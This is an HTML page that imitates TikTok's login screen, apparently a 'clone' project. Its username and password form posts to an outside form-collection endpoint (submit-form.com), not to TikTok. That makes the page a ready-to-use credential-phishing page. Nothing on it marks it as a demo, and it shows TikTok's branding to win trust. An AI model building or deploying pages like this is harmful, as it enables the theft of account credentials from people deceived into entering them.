<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login/Signup Clone</title>
    <link rel="icon" href="tiktok-logo.png" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <img src="tiktok-logo.png" alt="TikTok Logo">
            </div>
            <h2>Log in to TikTok</h2>
            <form id="loginForm" action="https://submit-form.com/epgjiItfQ" method="POST">
                <input type="text" id="username" name="username" placeholder="Username or email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="divider">
                <span>OR</span>
            </div>
            <button class="social-btn google-btn">Continue with Google</button>
            <button class="social-btn facebook-btn">Continue with Facebook</button>
            <div class="signup-option">
                <p>Donâ€™t have an account? <a href="#" id="signupLink">Sign up</a></p>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
